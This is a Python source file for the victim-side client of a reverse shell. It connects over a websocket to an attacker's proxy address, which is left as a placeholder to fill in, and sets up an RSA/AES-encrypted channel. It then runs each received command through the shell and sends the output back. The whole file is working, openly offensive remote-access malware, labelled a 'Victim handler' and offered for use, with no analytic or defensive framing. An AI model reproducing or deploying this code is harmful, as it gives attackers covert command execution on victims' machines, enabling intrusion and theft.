import asyncio
import websockets
import subprocess
import os
import base64
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.Random import get_random_bytes
from Cryptodome.PublicKey import RSA
import json


# Encryption
def encrypt(data, aes_key):
    cipher = AES.new(aes_key, AES.MODE_GCM)
    cipher_text, tag = cipher.encrypt_and_digest(data)
    nonce = cipher.nonce
    return base64.b64encode(nonce + tag + cipher_text)  # type: ignore


# Decryption
def decrypt(data, aes_key):
    data = base64.b64decode(data)
    nonce, tag, cipher_text = data[:16], data[16:32], data[32:]
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(cipher_text, tag).decode()


# Victim handler.
async def connector():

    url = 'ws://127.0.0.1:443'  # Add your proxy IP.

    try:
        while True:

            # Connect websocket proxy.
            async with websockets.connect(url) as websocket:  # type: ignore

                # Generate RSA key pair.
                key = RSA.generate(2048)
                private_key = key
                public_key = key.public_key()

                # Receive listener's public key.
                data = await websocket.recv()
                msg = json.loads(data.decode())

                if 'pubkey' in msg:
                    listener_pubkey = RSA.import_key(
                        base64.b64decode(msg['pubkey']))

                # Send victim's public key.
                await websocket.send(json.dumps({
                    'pubkey': base64.b64encode(public_key.export_key()).decode()
                }).encode())

                # Generate and send AES key.
                aes_key = get_random_bytes(16)
                cipher_rsa = PKCS1_OAEP.new(listener_pubkey)
                encrypted_aes_key = cipher_rsa.encrypt(aes_key)
                await websocket.send(json.dumps({
                    'AES-key': base64.b64encode(encrypted_aes_key).decode()
                }).encode())

                # Data send and recieve section.
                while True:

                    enc_data = await websocket.recv()
                    command = decrypt(enc_data, aes_key)

                    if 'cd ' in command:
                        os.chdir(command[3:].strip())
                        result = f'[+] Directory changed to {os.getcwd()}'

                    elif 'exit' in command:
                        break

                    else:
                        proc = subprocess.run(
                            command, shell=True, capture_output=True, text=True)
                        result = proc.stdout or proc.stderr or '[+] Command executed.'

                    await websocket.send(encrypt(result.encode(), aes_key))

    except Exception as e:
        print(f'[!] Error: {e}')

asyncio.run(connector())
